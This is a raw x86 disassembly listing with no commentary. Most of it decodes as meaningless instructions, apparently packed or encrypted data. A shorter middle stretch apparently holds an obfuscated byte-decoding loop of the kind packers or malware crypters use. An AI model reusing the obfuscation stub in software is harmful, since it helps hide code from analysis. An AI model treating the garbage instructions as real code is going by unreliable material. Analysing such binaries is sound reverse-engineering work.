  40389b:	ror    BYTE PTR [edi+0x21],cl
  40389e:	scas   al,BYTE PTR es:[edi]
  40389f:	(bad)  
  4038a0:	(bad)  
  4038a1:	mov    DWORD PTR fs:[ebx],esp
  4038a4:	(bad)  
  4038a5:	pop    esp
  4038a6:	rcr    BYTE PTR [ebp+ebx*4+0x36],cl
  4038aa:	loop   0x403860
  4038ac:	xchg   edx,eax
  4038ad:	mov    DWORD PTR gs:[edx-0x75],ebp
  4038b1:	xchg   esp,eax
  4038b2:	pop    ebx
  4038b3:	cmp    al,BYTE PTR [edi-0x6e78a9ff]
  4038b9:	pushf  
  4038ba:	push   es
  4038bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038bc:	das    
  4038bd:	inc    edi
  4038be:	mov    BYTE PTR [ebx+esi*1-0x76c95e05],ah
  4038c5:	jne    0x40388b
  4038c7:	xor    bh,dh
  4038c9:	add    dh,BYTE PTR [eax+0x6e843f31]
  4038cf:	and    al,ch
  4038d1:	out    0x52,al
  4038d3:	out    dx,al
  4038d4:	bound  ecx,QWORD PTR [eax]
  4038d6:	inc    ebx
  4038d7:	mov    cl,0xa5
  4038d9:	jmp    0x18a0:0x9c2e468e
  4038e0:	pusha  
  4038e1:	fwait
  4038e2:	scas   al,BYTE PTR es:[edi]
  4038e3:	mov    ecx,0xd64d55e0
  4038e8:	arpl   WORD PTR [esi],di
  4038ea:	mov    ebp,0xaaaffa68
  4038ef:	jb     0x40390f
  4038f1:	ret    0x4ecb
  4038f4:	pop    edi
  4038f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038f6:	mov    al,ds:0x82ba3b64
  4038fb:	pop    ebp
  4038fc:	jno    0x403897
  4038fe:	push   esi
  4038ff:	sub    esi,DWORD PTR [esp+eax*4]
  403902:	xchg   DWORD PTR [ebx+0x2d81f04d],ecx
  403908:	mov    ecx,0xa100426e
  40390d:	outs   dx,BYTE PTR ds:[esi]
  40390e:	inc    edx
  40390f:	add    BYTE PTR [ebx],dh
  403911:	mov    BYTE PTR [ecx+0x426f2d15],0x0
  403918:	add    eax,0x3300426f
  40391d:	into   
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xc9c4e32d,al
  403bc1:	push   edx
  403bc2:	jae    0x403bcd
  403bc4:	hlt    
  403bc5:	pushf  
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	(bad)  
  403bcd:	jmp    0x92d4:0x60c7ad9d
  403bd4:	push   ds
  403bd5:	push   es
  403bd6:	repnz or eax,0x3dea7b82
  403bdc:	push   esi
  403bdd:	shl    esi,0xe1
  403be0:	mov    ax,0x7f1c
  403be4:	ror    DWORD PTR [edx+0x5a0c205a],cl
  403bea:	sub    cl,dl
  403bec:	jg     0x403c31
  403bee:	jo     0x403c45
  403bf0:	cmp    ebp,DWORD PTR [edi+0x37]
  403bf3:	pop    edi
  403bf4:	xor    al,0x96
  403bf6:	imul   eax,DWORD PTR [edx-0x62483d00],0x62
  403bfd:	jecxz  0x403c24
  403bff:	ja     0x403c64
  403c01:	sub    al,0xd3
  403c03:	adc    BYTE PTR ds:0x11c07245,ch
  403c09:	in     al,0xb0
  403c0b:	and    al,0xba
  403c0d:	lods   eax,DWORD PTR ds:[esi]
  403c0e:	loop   0x403c00
  403c10:	or     al,0x6c
  403c12:	jecxz  0x403c10
  403c14:	dec    esi
  403c15:	jecxz  0x403bf0
  403c17:	mov    bh,0x95
  403c19:	mov    cl,0xd8
  403c1b:	icebp  
  403c1c:	repnz out 0x7,al
  403c1f:	call   0x6422:0xef180b71
  403c26:	ss es xor al,0xbc
  403c2a:	icebp  
  403c2b:	out    0x0,al
  403c2d:	mov    dl,0x57
  403c2f:	mov    ch,0x77
  403c31:	rcr    dl,cl
  403c33:	or     ah,BYTE PTR [ecx-0xa1a76ed]
  403c39:	loope  0x403c5d
  403c3b:	mov    ah,0xa4
  403c3d:	mov    ebx,esi
  403c3f:	jle    0x403cba
  403c41:	jmp    0xb650:0x56fbbcc7
  403c48:	out    dx,eax
  403c49:	push   cs
  403c4a:	mov    ecx,0x9bbf5152
  403c4f:	jne    0x403c43
  403c51:	and    esp,ecx
  403c53:	add    eax,0xed6190cb
  403c58:	ins    BYTE PTR es:[edi],dx
  403c59:	(bad)  
  403c5a:	jp     0x403c5d
  403c5c:	adc    DWORD PTR ds:0x610717bd,0xffffffe8
  403c63:	push   0xf44f3068
  403c68:	sbb    BYTE PTR [ebp-0x5c],0x3
  403c6c:	loope  0x403c54
  403c6e:	sub    eax,DWORD PTR [edi]
  403c70:	sub    cl,cl
  403c72:	dec    ebp
  403c73:	mov    esp,0xf9842229
  403c78:	dec    ebx
  403c79:	fcomi  st,st(0)
  403c7b:	adc    DWORD PTR [edi+0x4d829f7c],0x6005f36f
  403c85:	xor    BYTE PTR [edi+0x6b1b22de],0x4c
  403c8c:	rcl    DWORD PTR [ecx],cl
  403c8e:	cmc    
  403c8f:	in     eax,dx
  403c90:	fwait
  403c91:	xor    al,0xb2
  403c93:	ss push 0xebecbd1
  403c99:	cli    
  403c9a:	mov    ebx,DWORD PTR [edi-0x5e99e4f3]
  403ca0:	push   esi
  403ca1:	cdq    
  403ca2:	sub    al,0xfa
  403ca4:	push   ss
  403ca5:	mov    al,0xf1
  403ca7:	iret   
  403ca8:	sti    
  403ca9:	mov    ecx,0x4f1b951b
  403cae:	loop   0x403d2f
  403cb0:	ins    DWORD PTR es:[di],dx
  403cb2:	call   0x5f4792d3
  403cb7:	push   0xb16648ef
  403cbc:	sbb    bh,dl
  403cbe:	int    0xf1
  403cc0:	and    ch,BYTE PTR [edx+0x3291a43e]
  403cc6:	call   FWORD PTR [edi-0x5e41c9a4]
  403ccc:	into   
  403ccd:	aam    0x0
  403ccf:	sub    DWORD PTR [esi+eiz*2-0x51],ebp
  403cd3:	xor    BYTE PTR ds:0x9ed1823a,ch
  403cd9:	add    cl,dh
  403cdb:	gs push ecx
  403cdd:	hlt    
  403cde:	mov    dh,0xb6
  403ce0:	xor    ebx,DWORD PTR [esi+0x62]
  403ce3:	sbb    BYTE PTR [ebp-0x49e0d4cf],bh
  403ce9:	in     eax,dx
  403cea:	inc    edx
  403ceb:	mov    ch,BYTE PTR [esi+0x43]
  403cee:	test   al,0xc2
  403cf0:	and    al,0xd3
  403cf2:	stc    
  403cf3:	ror    DWORD PTR [edx],0xd3
  403cf6:	pop    ss
  403cf7:	imul   esi,edi,0xa524048b
  403cfd:	lock cli 
  403cff:	lods   eax,DWORD PTR ds:[esi]
  403d00:	cmp    eax,0x856b40bb
  403d05:	adc    BYTE PTR [edx],ch
  403d07:	loopne 0x403d2c
  403d09:	loopne 0x403d37
  403d0b:	mov    ebx,0x72e4df0e
  403d10:	push   ss
  403d11:	or     al,bl
  403d13:	rol    DWORD PTR [edx-0x49],0x59
  403d17:	popa   
  403d18:	mov    esi,0xe3012375
  403d1d:	push   esp
  403d1e:	adc    BYTE PTR [esi],bl
  403d20:	(bad)  
  403d21:	and    DWORD PTR [esi],ecx
  403d23:	int3   
  403d24:	sbb    al,0xdf
  403d26:	lods   al,BYTE PTR ds:[esi]
  403d27:	test   DWORD PTR ds:0x830004d9,0x3981fc06
  403d31:	idiv   DWORD PTR [ebx-0x31225c6e]
  403d37:	in     al,0x45
  403d39:	loop   0x403ccd
  403d3b:	sbb    eax,0x20b41ddb
  403d40:	std    
  403d41:	dec    esi
  403d42:	outs   dx,DWORD PTR ds:[esi]
  403d43:	into   
  403d44:	push   eax
  403d45:	not    BYTE PTR [esi+0x24]
  403d48:	in     al,0x49
  403d4a:	lahf   
  403d4b:	or     esi,DWORD PTR [ecx-0x72]
  403d4e:	adc    BYTE PTR [ebp-0x6d],bl
  403d51:	cdq    
  403d52:	retf   
  403d53:	mov    DWORD PTR [esp+edi*2],ebp
  403d56:	rcl    BYTE PTR [ecx-0x76],cl
  403d59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d5a:	jb     0x403d4a
  403d5c:	cmc    
  403d5d:	aam    0x44
  403d5f:	sub    eax,0x9eff0366
  403d64:	sti    
  403d65:	sbb    ecx,DWORD PTR [edi]
  403d67:	xor    al,0xeb
  403d69:	mov    esp,0x17f3963d
  403d6e:	cs xchg ecx,eax
  403d70:	sbb    DWORD PTR [edi],ebx
  403d72:	cli    
  403d73:	jno    0x403d2f
  403d75:	adc    eax,0x7886625f
  403d7a:	mov    DWORD PTR [ebx],edx
  403d7c:	mov    edx,DWORD PTR [edx+esi*2+0x59]
  403d80:	sbb    DWORD PTR [ebx+0x7ec0ef1],0x2d
  403d87:	dec    edi
  403d88:	xchg   edi,eax
  403d89:	pop    edx
  403d8a:	or     DWORD PTR [ebx],0xacd7631a
  403d90:	mov    dl,0xa4
  403d92:	mov    bl,0xf4
  403d94:	or     BYTE PTR ds:0x50146d3b,0xc9
  403d9b:	fdiv   st(4),st
  403d9d:	out    0xbd,eax
  403d9f:	ret    0x2a60
  403da2:	mov    cl,0x5d
  403da4:	xor    eax,0xa1a848a1
  403da9:	out    dx,al
  403daa:	xlat   BYTE PTR ds:[ebx]
  403dab:	cmp    bh,BYTE PTR [ebx-0x80]
  403dae:	pushf  
  403daf:	xor    al,0x22
  403db2:	sti    
  403db3:	inc    eax
  403db4:	and    bh,BYTE PTR [eax+edx*8+0x2a]
  403db8:	sub    ebp,DWORD PTR [eax+0x29d6f86]
  403dbe:	inc    ebp
  403dbf:	xchg   esi,eax
  403dc0:	aad    0xd1
  403dc2:	sahf   
  403dc3:	stc    
  403dc4:	mov    eax,ds:0xc735950c
  403dc9:	sti    
  403dca:	jne    0x403de6
  403dcc:	xchg   esp,eax
  403dcd:	mov    al,BYTE PTR [edi-0x7a]
  403dd0:	test   al,0x96
  403dd2:	push   0x1634e0c9
  403dd7:	or     al,0xf7
  403dd9:	test   bh,bh
  403ddb:	popa   
  403ddc:	lock mov cl,0xaa
  403ddf:	sbb    BYTE PTR [ecx-0x22],ch
  403de2:	mov    esp,0x5ba5ae07
  403de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403de8:	push   0xc5be1a5f
  403ded:	xchg   esi,eax
  403dee:	add    ch,BYTE PTR [eax+ebx*8]
  403df1:	pop    edx
  403df2:	push   0x2e7a2ad7
  403df7:	into   
  403df8:	mov    dh,0x32
  403dfa:	sti    
  403dfb:	xchg   ecx,eax
  403dfc:	neg    DWORD PTR [ebp+0x58019a8f]
  403e02:	xlat   BYTE PTR ds:[ebx]
  403e03:	repz test BYTE PTR [esi+0x4],ch
  403e07:	xchg   ebp,eax
  403e08:	mov    bh,BYTE PTR [ecx]
  403e0a:	sub    al,0xa6
  403e0c:	xor    ebp,DWORD PTR [edi]
  403e0e:	hlt    
  403e0f:	retf   0xdc1b
  403e12:	outs   dx,BYTE PTR ds:[esi]
  403e13:	jne    0x403e7f
  403e15:	ja     0x403dfa
  403e17:	push   ecx
  403e18:	jnp    0x403d9a
  403e1a:	(bad)  
  403e1b:	xor    eax,0x2c83f548
  403e20:	pop    edi
  403e21:	jo     0x403e79
  403e23:	ja     0x403e2a
  403e25:	mov    ch,0x51
  403e27:	ror    BYTE PTR [ecx+0x44],cl
  403e2a:	adc    eax,0x38c4dc92
  403e2f:	ss jns 0x403e3b
  403e32:	dec    edi
  403e33:	inc    ebx
  403e34:	cli    
  403e35:	out    dx,al
  403e36:	imul   ebp,edx,0xfffffff1
  403e39:	and    ecx,DWORD PTR [edi+0x21c99f75]
  403e3f:	addr16 (bad) 
  403e41:	jg     0x403e2a
  403e43:	fisubr DWORD PTR [ebx]
  403e45:	jecxz  0x403e30
  403e47:	scas   eax,DWORD PTR es:[edi]
  403e48:	call   0xde566143
  403e4d:	adc    ebx,DWORD PTR [esi+0x32ede008]
  403e53:	out    dx,al
  403e54:	mov    edi,0x6587f25
  403e59:	push   0x0
  403e5b:	jmp    0x8e03a7
  403e60:	mov    ch,0x9b
  403e62:	les    edi,FWORD PTR [ebp+0x21]
  403e65:	pop    ebp
  403e66:	mov    ah,0xe5
  403e68:	xchg   ecx,eax
  403e69:	les    esp,FWORD PTR [ebx+0x2bcdc330]
  403e6f:	jne    0x403dfc
  403e71:	sub    eax,ebp
  403e73:	sbb    BYTE PTR [ebp-0x1decf54],bh
  403e79:	(bad)  [edi-0x6cbb544c]
  403e7f:	or     ebx,eax
  403e81:	dec    ebx
  403e82:	ds aam 0xee
  403e85:	and    dh,BYTE PTR [ecx+0x30]
  403e88:	cmp    esi,DWORD PTR [ebp+esi*8+0x72]
  403e8c:	mov    BYTE PTR [ebx-0x681de11c],dh
  403e92:	push   ds
  403e93:	mov    edx,0x955d55f4
  403e98:	test   BYTE PTR [eax-0x5def8aae],ah
  403e9e:	xchg   ecx,eax
  403e9f:	ja     0x403efa
  403ea1:	push   cs
  403ea2:	adc    cl,BYTE PTR [ebp+0x582bb2a1]
  403ea8:	(bad)  
  403ea9:	loop   0x403edb
  403eab:	mov    ebx,0x78c7c09f
  403eb0:	pop    ebx
  403eb1:	jae    0x403ef1
  403eb3:	push   ss
  403eb4:	and    dh,BYTE PTR [edx]
  403eb6:	push   0xffffffe3
  403eb8:	push   esi
  403eb9:	inc    edx
  403eba:	popf   
  403ebb:	xchg   ebp,eax
  403ebc:	test   eax,0x27afc76f
  403ec1:	out    0x3c,al
  403ec3:	add    bl,BYTE PTR ds:0xc7499b3f
  403ec9:	sbb    ah,bh
  403ecb:	dec    ebx
  403ecc:	test   BYTE PTR [edi+0x18285a03],dl
  403ed2:	mov    edi,DWORD PTR [edx+ecx*1+0x1d6541bd]
  403ed9:	mov    esi,0xf72dc3bc
  403ede:	inc    DWORD PTR [ecx]
  403ee0:	and    cl,al
  403ee2:	ds cs ins DWORD PTR es:[edi],dx
  403ee5:	jmp    0x403e93
  403ee7:	sub    eax,0xdfebb85f
  403eec:	xchg   ecx,eax
  403eed:	mov    esp,0x4229cc3
  403ef2:	sub    al,0xf9
  403ef4:	mov    dh,0xc7
  403ef6:	in     eax,0x63
  403ef8:	xor    eax,0x92bda33b
  403efd:	cdq    
  403efe:	sbb    DWORD PTR [eax-0x4bddd25f],ecx
  403f04:	fs imul ecx,esi,0xf2be8755
  403f0b:	aad    0x94
  403f0d:	mov    bh,0xc4
  403f0f:	cli    
  403f10:	icebp  
  403f11:	sub    dl,cl
  403f13:	jns    0x403f43
  403f15:	jae    0x403f20
  403f17:	in     al,0x62
  403f19:	out    0x79,al
  403f1b:	mov    eax,ds:0x379f30b6
  403f20:	or     edi,DWORD PTR [edi+0x7d]
  403f23:	dec    ecx
  403f24:	mov    ch,0x1d
  403f26:	fld    DWORD PTR [esi]
  403f28:	lock push 0xeb28b385
  403f2e:	mov    al,BYTE PTR [eax-0x23]
  403f31:	mov    edi,0xb2a6a64d
  403f36:	mov    edx,0xaf4135ac
  403f3b:	lods   eax,DWORD PTR ds:[esi]
  403f3c:	stc    
  403f3d:	call   0xbad0:0x96d01b1e
  403f44:	cmc    
  403f45:	das    
  403f46:	xor    al,BYTE PTR [edi-0x1d54b417]
  403f4c:	rcl    ebp,0x50
  403f4f:	jns    0x403f37
  403f51:	adc    eax,0x5b257732
  403f56:	ret    
  403f57:	sbb    cl,bl
  403f59:	sbb    BYTE PTR [ecx+0x62fdd71a],dh
  403f5f:	das    
  403f60:	or     cl,0x70
  403f63:	push   ebx
  403f64:	push   es
  403f65:	sbb    dh,BYTE PTR [eax-0x5ab49683]
  403f6b:	pop    ebp
  403f6c:	mov    ebp,0xf1821700
  403f71:	adc    eax,0x236a7cd2
  403f76:	sbb    ebp,DWORD PTR [ebx+eax*2+0x6f]
  403f7a:	(bad)  
  403f7b:	mov    esi,0x187473e1
  403f80:	(bad)  ds:0x58aced7a
  403f86:	in     al,0x4f
  403f88:	mov    al,ds:0x2f9feb1a
  403f8d:	dec    ebx
  403f8e:	xor    al,0x48
  403f90:	stc    
  403f91:	sub    eax,0xe3a2eca5
  403f96:	add    ebx,ebx
  403f98:	js     0x403f29
  403f9a:	sbb    DWORD PTR [edi+ebx*1],eax
  403f9d:	xchg   DWORD PTR [ebp-0x2e88947a],eax
  403fa3:	ret    0x5a44
  403fa6:	add    al,0x3f
  403fa8:	dec    edi
  403fa9:	clc    
  403faa:	cmp    ecx,ebx
  403fac:	fisubr WORD PTR [esi+0x35]
  403faf:	mov    ecx,0x75e134b6
  403fb4:	fst    st(2)
  403fb6:	sbb    esi,DWORD PTR [eax-0x5de69fc7]
  403fbc:	stc    
  403fbd:	jp     0x403ff2
  403fbf:	add    ebp,DWORD PTR [ebp-0x47]
  403fc2:	pop    es
  403fc3:	test   DWORD PTR [edx],0xa1201742
  403fc9:	popf   
  403fca:	stos   DWORD PTR es:[edi],eax
  403fcb:	outs   dx,BYTE PTR ds:[esi]
  403fcc:	(bad)  
  403fce:	jmp    0x1302c7be
  403fd3:	repnz sub al,0x11
  403fd6:	call   0xeb58:0x77cbc679
  403fdd:	push   ebx
  403fde:	and    DWORD PTR [edx],ebx
  403fe0:	push   eax
  403fe1:	or     eax,0x57f5b035
  403fe6:	cmp    al,0xdc
  403fe8:	int    0x18
  403fea:	sbb    al,0xa1
  403fec:	sub    eax,0xde400d60
  403ff1:	adc    DWORD PTR [edx-0x4f0e97d7],esi
  403ff7:	loop   0x40401f
  403ff9:	repz scas eax,DWORD PTR es:[edi]
  403ffb:	or     eax,DWORD PTR [esi+0x5f87e5f2]
  404001:	pushf  
  404002:	xchg   edx,eax
  404003:	sbb    ebp,edi
  404005:	jae    0x404058
  404007:	mov    ds:0xccf9de82,al
  40400c:	jp     0x403f9d
  40400e:	jo     0x404000
  404010:	jb     0x404043
  404012:	mov    ch,0x9d
  404014:	sbb    BYTE PTR [esi+0x2f],0x5e
  404018:	shl    ebp,1
  40401a:	in     eax,0x81
  40401c:	sub    al,0x10
  40401e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40401f:	adc    al,0x30
  404021:	enter  0x7430,0xa3
  404025:	pop    ebp
  404026:	std    
  404027:	stos   BYTE PTR es:[edi],al
  404028:	bound  edi,QWORD PTR [ebp+0x41]
  40402b:	dec    ebp
  40402c:	sub    DWORD PTR [esi],eax
  40402e:	or     eax,0x26d9d32a
  404033:	stos   DWORD PTR es:[edi],eax
  404034:	out    0x29,eax
  404036:	mov    bh,0xe0
  404038:	daa    
  404039:	fst    st(4)
  40403b:	pop    ds
  40403c:	lock nop
  40403e:	push   edi
  40403f:	xor    BYTE PTR [ecx-0x4d],0x6f
  404043:	fstp   TBYTE PTR [ebx]
  404045:	popa   
  404046:	adc    DWORD PTR [esi+0x5cc913d6],edx
  40404c:	pop    ss
  40404d:	out    0xfd,al
  40404f:	xchg   ebx,eax
  404050:	fs icebp 
  404052:	jle    0x403fec
  404054:	mov    dl,0xf7
  404056:	pop    ebx
  404057:	mov    bl,0xd8
  404059:	aas    
  40405a:	je     0x404068
  40405c:	push   ds
  40405d:	and    DWORD PTR [esi+0x0],ebp
  404060:	call   0xf8e4:0xd6e506ec
  404067:	jmp    0x404038
  404069:	mov    bh,0x3d
  40406b:	mov    eax,ds:0x3156c369
  404070:	aam    0xaf
  404072:	sbb    dh,bh
  404074:	stos   DWORD PTR es:[edi],eax
  404075:	jl     0x404012
  404077:	ret    0xe677
  40407a:	scas   eax,DWORD PTR es:[edi]
  40407b:	fild   QWORD PTR [ecx-0x2f]
  40407e:	test   BYTE PTR [edx],0x98
  404081:	or     dl,0xb3
  404084:	adc    eax,0xef989f15
  404089:	hlt    
  40408a:	(bad)  
  40408b:	sub    eax,0xe16599f7
  404090:	push   0xb3326952
  404095:	mov    ebp,0xd6bde586
  40409a:	test   al,0x3d
  40409c:	in     al,0xa6
  40409e:	adc    eax,0x6cc4220a
  4040a3:	in     eax,0x33
  4040a5:	sbb    cl,dl
  4040a7:	rol    BYTE PTR [esi+esi*2+0x69],cl
  4040ab:	xlat   BYTE PTR ds:[ebx]
  4040ac:	daa    
  4040ad:	scas   al,BYTE PTR es:[edi]
  4040ae:	ins    BYTE PTR es:[edi],dx
  4040af:	pop    esi
  4040b0:	pop    ss
  4040b1:	add    DWORD PTR [eax+eax*4],edi
  4040b4:	in     al,0x67
  4040b6:	inc    edi
  4040b7:	mov    eax,0x93cd4f22
  4040bc:	sar    BYTE PTR [edi-0x4b9bdc71],cl
  4040c2:	mov    bh,0xff
  4040c4:	jge    0x4040de
  4040c6:	dec    esp
  4040c7:	dec    ebp
  4040c8:	in     al,dx
  4040c9:	fstp   QWORD PTR [ebx]
  4040cb:	out    0x54,al
  4040cd:	adc    DWORD PTR [ebp-0xc24039d],0xfffffffd
  4040d4:	jp     0x40408b
  4040d6:	adc    eax,0xf0d622
  4040db:	mov    ebx,0x4639aa9d
  4040e0:	cmp    BYTE PTR [esi+0x16],0xa1
  4040e4:	inc    edx
  4040e5:	push   0xcc37e771
  4040ea:	iret   
  4040eb:	sbb    BYTE PTR [edi],al
  4040ed:	pop    esp
  4040ee:	addr16 xchg ebp,esp
  4040f1:	ffree  st(0)
  4040f3:	adc    al,bl
  4040f5:	and    ebp,DWORD PTR [ebp-0x2c]
  4040f8:	test   ecx,edi
  4040fa:	and    edi,edx
  4040fc:	push   esi
  4040fd:	pop    esi
  4040fe:	jg     0x40411b
  404100:	fnstcw WORD PTR gs:[ebp-0x71]
  404104:	arpl   WORD PTR [eax],si
  404106:	fwait
  404107:	stc    
  404108:	bound  esp,QWORD PTR [edx-0x60]
  40410b:	or     eax,DWORD PTR [esp+esi*8-0x9ccb37b]
  404112:	shl    BYTE PTR [ebp+0x2e],0x93
  404116:	pop    esi
  404117:	ins    BYTE PTR es:[edi],dx
  404118:	jno    0x404167
  40411a:	adc    edx,DWORD PTR [edx+0x67]
  40411d:	dec    ebp
  40411e:	jbe    0x404195
  404120:	xchg   edx,eax
  404121:	push   0x553a96c9
  404126:	dec    ecx
  404127:	xchg   edx,eax
  404128:	or     eax,0x72cf7796
  40412d:	and    ebp,edx
  40412f:	xchg   esp,eax
  404130:	pop    ds
  404131:	sub    ecx,DWORD PTR [esi+edi*8-0x5d96c455]
  404138:	pop    ss
  404139:	mov    BYTE PTR [edi],al
  40413b:	loopne 0x404123
  40413d:	xchg   al,al
  40413f:	lahf   
  404140:	lds    edi,FWORD PTR gs:0xb5727f4b
  404147:	push   es
  404148:	mov    eax,0xc92dadbd
  40414d:	loope  0x4040d7
  40414f:	push   esi
  404150:	js     0x404188
  404152:	lahf   
  404153:	jne    0x4041b6
  404155:	sahf   
  404156:	sub    al,0xfb
  404158:	test   BYTE PTR ds:0x33caec3d,0x7a
  40415f:	fwait
  404160:	adc    ah,BYTE PTR [ebp+0x24]
  404163:	daa    
  404164:	nop
  404165:	(bad)  
  404166:	pop    esi
  404167:	addr16 bnd jb 0x404147
  40416b:	xor    bh,BYTE PTR [edi+0x43]
  40416e:	sbb    bh,BYTE PTR [edi+0x21]
  404171:	dec    esp
  404172:	sub    al,0xa9
  404174:	ins    DWORD PTR es:[edi],dx
  404175:	lahf   
  404176:	sbb    eax,0x4719c996
  40417b:	shr    DWORD PTR [eax+0x73],0xa9
  40417f:	clc    
  404180:	jg     0x4041f2
  404182:	sub    DWORD PTR [ebx+0x4f6682d3],edx
